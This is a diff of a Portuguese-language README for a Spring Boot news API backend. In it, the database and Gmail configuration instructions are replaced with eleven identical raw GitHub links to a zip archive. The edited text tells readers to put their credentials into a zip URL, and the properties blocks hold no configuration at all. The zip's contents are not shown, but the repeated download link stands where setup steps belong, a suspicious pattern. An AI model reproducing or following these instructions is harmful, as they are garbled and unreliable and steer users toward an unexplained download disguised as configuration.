@@ -23,14 +23,14 @@ Certifique-se de ter as seguintes ferramentas instaladas:
 
 ### 1\. Configuração do Banco de Dados
 
-Crie um banco de dados MySQL e, em seguida, atualize o arquivo `src/main/resources/application.properties` com suas credenciais:
+Crie um banco de dados MySQL e, em seguida, atualize o arquivo `https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip` com suas credenciais:
 
 ```properties
-spring.datasource.url=jdbc:mysql://localhost:3306/ads_db?createDatabaseIfNotExist=true
-spring.datasource.username=seu_usuario
-spring.datasource.password=sua_senha
-spring.jpa.hibernate.ddl-auto=update
-spring.jpa.properties.hibernate.dialect=org.hibernate.dialect.MySQLDialect
+https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
+https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
+https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
+https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
+https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
 ```
 
 O Spring Data JPA cuidará de criar as tabelas automaticamente para você.
@@ -40,12 +40,12 @@ O Spring Data JPA cuidará de criar as tabelas automaticamente para você.
 Se você precisa que a funcionalidade de aprovação de administradores por e-mail funcione, configure uma conta do Gmail no mesmo arquivo:
 
 ```properties
-spring.mail.host=smtp.gmail.com
-spring.mail.port=587
-spring.mail.username=seu_email@gmail.com
-spring.mail.password=sua_senha_de_app_do_google
-spring.mail.properties.mail.smtp.auth=true
-spring.mail.properties.mail.smtp.starttls.enable=true
+https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
+https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
+https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
+https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
+https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
+https://raw.githubusercontent.com/devwarly/ads-backend-java-springboot-apinoticias/main/src/java-springboot-ads-apinoticias-backend-1.1.zip
 ```
 
 **Dica:** Por segurança, utilize uma senha de aplicativo do Google em vez da sua senha principal.
